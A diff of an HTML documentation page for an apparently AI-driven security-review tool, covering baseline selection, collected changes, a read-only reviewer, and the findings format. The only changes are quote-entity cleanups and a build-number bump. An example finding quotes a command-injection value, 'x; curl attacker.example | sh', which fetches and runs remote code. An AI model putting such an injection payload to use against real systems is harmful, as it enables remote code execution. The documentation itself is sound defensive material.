@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-base="/docs/" data-page-lang="en" data-build="1789756792" data-alt-lang-url="/docs/capabilities/security-review.zh.html">
+<html lang="en" data-base="/docs/" data-page-lang="en" data-build="1789757277" data-alt-lang-url="/docs/capabilities/security-review.zh.html">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -152,7 +152,7 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <li>failing that, the merge base with a default branch (<code>origin/HEAD</code>, <code>origin/main</code>, <code>origin/master</code>, then their local names) — the same answer for a branch that has not been pushed yet.</li>
 </ol>
 <p>A repository with neither raises <code>NoBaselineError</code> naming what was missing. It does not fall back to <code>HEAD~1</code> or the root commit: a guessed range reviews the wrong changes and says nothing about having done so. Pass the baseline yourself when you want a specific range:</p>
-<pre><code class="language-python"><span class="n">run_security_review</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="s2">&quot;v2.1.0&quot;</span><span class="p">)</span>
+<pre><code class="language-python"><span class="n">run_security_review</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="s2">"v2.1.0"</span><span class="p">)</span>
 </code></pre>
 <h2 id="what-is-collected">What is collected<a class="header-anchor" href="#what-is-collected">#</a></h2>
 <p>One diff against the working tree, so committed, staged and unstaged changes all land in the same review — you get the same answer whether or not you committed first. Untracked files are diffed in as well, because a new file is where a hardcoded secret is most likely to be and a plain diff cannot see it. Ignored files stay out, so build output and vendored trees never enter the review, and the index you are composing is never touched.</p>
@@ -205,13 +205,13 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <h2 id="read-only-by-construction">Read-only by construction<a class="header-anchor" href="#read-only-by-construction">#</a></h2>
 <p>The review agent gets <code>read</code>, <code>grep</code>, <code>glob</code>, <code>list</code> and <code>bash</code> — no <code>write</code>, <code>edit</code>, <code>apply_patch</code>, or agent spawning. A reviewer that can write is a reviewer that can &quot;fix&quot; what it thinks it found, and a security opinion is worth nothing if producing it changed the thing under review. Fixes come back as recommendations for you to apply.</p>
 <h2 id="what-it-returns">What it returns<a class="header-anchor" href="#what-it-returns">#</a></h2>
-<pre><code class="language-python"><span class="p">{</span><span class="s2">&quot;base&quot;</span><span class="p">:</span> <span class="s2">&quot;a1b2c3d…&quot;</span><span class="p">,</span> <span class="s2">&quot;files_reviewed&quot;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;findings&quot;</span><span class="p">:</span> <span class="p">[</span>
-    <span class="p">{</span><span class="s2">&quot;severity&quot;</span><span class="p">:</span> <span class="s2">&quot;critical&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;file&quot;</span><span class="p">:</span> <span class="s2">&quot;api/users.py&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;line&quot;</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span>
-     <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;Command injection through the export filename&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;scenario&quot;</span><span class="p">:</span> <span class="s2">&quot;An authenticated caller sets filename to `x; curl attacker.example | sh`; the value reaches subprocess with shell=True and runs as the service account.&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;recommendation&quot;</span><span class="p">:</span> <span class="s2">&quot;Pass the argument list to subprocess without shell=True, and reject filenames outside [A-Za-z0-9._-].&quot;</span><span class="p">},</span>
+<pre><code class="language-python"><span class="p">{</span><span class="s2">"base"</span><span class="p">:</span> <span class="s2">"a1b2c3d…"</span><span class="p">,</span> <span class="s2">"files_reviewed"</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">"findings"</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">{</span><span class="s2">"severity"</span><span class="p">:</span> <span class="s2">"critical"</span><span class="p">,</span>
+     <span class="s2">"file"</span><span class="p">:</span> <span class="s2">"api/users.py"</span><span class="p">,</span>
+     <span class="s2">"line"</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span>
+     <span class="s2">"title"</span><span class="p">:</span> <span class="s2">"Command injection through the export filename"</span><span class="p">,</span>
+     <span class="s2">"scenario"</span><span class="p">:</span> <span class="s2">"An authenticated caller sets filename to `x; curl attacker.example | sh`; the value reaches subprocess with shell=True and runs as the service account."</span><span class="p">,</span>
+     <span class="s2">"recommendation"</span><span class="p">:</span> <span class="s2">"Pass the argument list to subprocess without shell=True, and reject filenames outside [A-Za-z0-9._-]."</span><span class="p">},</span>
 <span class="p">]}</span>
 </code></pre>
 <p>Findings come ordered with <code>critical</code> first. Severity is about consequence:</p>
